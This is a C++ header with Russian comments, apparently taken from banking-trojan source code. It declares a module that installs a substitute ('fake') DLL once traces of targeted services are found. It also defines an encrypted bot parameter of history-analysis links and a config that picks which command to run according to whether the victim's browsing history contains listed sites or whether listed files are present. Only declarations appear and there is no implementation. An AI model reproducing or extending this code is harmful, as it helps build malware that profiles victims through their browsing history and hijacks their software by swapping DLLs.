//---------------------------------------------------------------------------
//
//  Модуль инсталяции подставной DLL (Fake DLL)
//
//  Модуль ищет на компьютере следы необходимых
//  сервисов и, в случае нахождения, выполняет
//  команду установки подставной длл
//
//
//---------------------------------------------------------------------------

#ifndef FakeDllInstallerH
#define FakeDllInstallerH

//---------------------------------------------------------------------------
#include <windows.h>
#include "Strings.h"


#define BOTPARAM_HISANALIZERLINKS "_HIS_ANALIZER_LINKS_\0"

#define BOTPARAM_SIZE_HISANALIZERLINKS 10000

#define BOTPARAM_HASH_HISANALIZERLINKS 0x8CBDB122 /* _HIS_ANALIZER_LINKS_ */


#ifdef DEBUGCONFIG
#	define BOTPARAM_ENCRYPTED_HISANALIZERLINKS false
#else
#	define BOTPARAM_ENCRYPTED_HISANALIZERLINKS true
#endif



typedef struct THistoryConfig
{
	PCHAR Command1;   // Основная команда. Выполнится если в истории
					  // будет найдено вхождение хотя-бы одного сайта из списка.
					  // В противном случае выполнится альтернативная команда
	PCHAR Command2;   // Альтернативная команда
	PStrings Sites;   // Список искомых сайтов
	PStrings Files;   // Список искомых на машине пользователя файлов
	bool ContainsURL; // Признак того, что один из сайтов найден в истории
} *PHistoryConfig;


namespace FKI
{
	//------------------------------------------------------
	// Execute - Фуекция запускает анализ истории навигации
	//------------------------------------------------------
	void Execute();
}


//---------------------------------------------------------------------------
#endif
